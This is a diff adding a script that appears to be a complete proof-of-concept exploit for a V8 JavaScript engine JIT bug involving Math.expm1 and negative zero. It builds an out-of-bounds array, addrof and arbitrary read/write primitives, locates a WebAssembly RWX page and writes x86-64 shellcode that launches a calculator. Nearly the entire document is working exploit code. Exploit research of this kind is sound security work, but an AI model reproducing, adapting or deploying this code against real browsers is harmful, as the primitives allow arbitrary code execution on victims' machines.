@@ -1,0 +1,101 @@
+<script>
+    function hex(val){
+  return "0x" + val.toString(16);
+}
+
+function ftoi(val) {
+  const floatArray = new Float64Array(1);
+  floatArray[0] = val;
+
+  const intArray = new Uint32Array(floatArray.buffer);
+  return BigInt(intArray[0]) + (BigInt(intArray[1]) << 32n);
+}
+
+function itof(val) {
+  const intArray = new Uint32Array(2);
+  intArray[0] = Number(val & 0xffffffffn);
+  intArray[1] = Number(val >> 32n);
+
+  const floatArray = new Float64Array(intArray.buffer);
+  return floatArray[0];
+}
+
+let oob_arr;
+function foo(x) {
+  let zero = {minus: -0};
+  let oob = Object.is(Math.expm1(x), zero.minus);
+  oob *= 11;
+  let a = [1.1,1.2,1.3];
+  let b = [2.1,2.2,2.3];
+  oob_arr = b;
+  a[oob] = itof(40000000000000n);
+}
+
+foo(0);
+
+for(let i = 0; i < 0x10000; i++) {
+  foo("0")
+}
+
+foo(-0);
+print("oobArray's length",oob_arr.length);
+
+let victim_Obj = {'a':0x6969, 'b':0x9999};
+let victim_aBuf = new ArrayBuffer(0xfeed);
+let dataview = new DataView(victim_aBuf);
+
+let b_offset;
+ for(let i = 0; i < 50000; i++) {
+   let val = ftoi(oob_arr[i]);
+   if(val === 0x696900000000n) {
+    b_offset = i + 1;
+    print("offset of b: ",hex(b_offset)); 
+    break;
+  }
+}
+
+let backing_store;
+ for(let i = 0; i < 50000; i++) {
+   let val = ftoi(oob_arr[i]);
+   if(val === 0xfeedn) {
+   backing_store = i + 1;
+   print("offset of backing store: ",hex(backing_store));
+   break;
+  } 
+}
+
+let arb = {
+	addrof(addr){
+		victim_Obj.b = addr;
+		return ftoi(oob_arr[b_offset]) - 0x1n;
+	},
+	read(addr){
+		oob_arr[backing_store] = itof(addr);
+		return ftoi(dataview.getFloat64(0, true));
+	},
+	write(addr,value){
+		oob_arr[backing_store] = itof(addr);
+		return dataView.setFloat64(0, value, true);
+	},
+	write_shellcode(addr, bytes){
+		oob_arr[backing_store] = itof(addr);
+		for(let i=0; i < bytes.length; i++){
+			dataview.setUint8(i, bytes[i]);
+		}
+}};
+
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule);
+let exp = wasmInstance.exports.main;
+
+wasmInstanceAddr = arb.addrof(wasmInstance);
+print("address of wasmInstance: ", hex(wasmInstanceAddr))
+rwx_page = arb.read(wasmInstanceAddr+0xe8n);
+print("rwx_page address: ", hex(rwx_page))
+var pop_calc = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x00];
+arb.write_shellcode(rwx_page, pop_calc);
+print("popping calc :)")
+
+exp();
+</script>
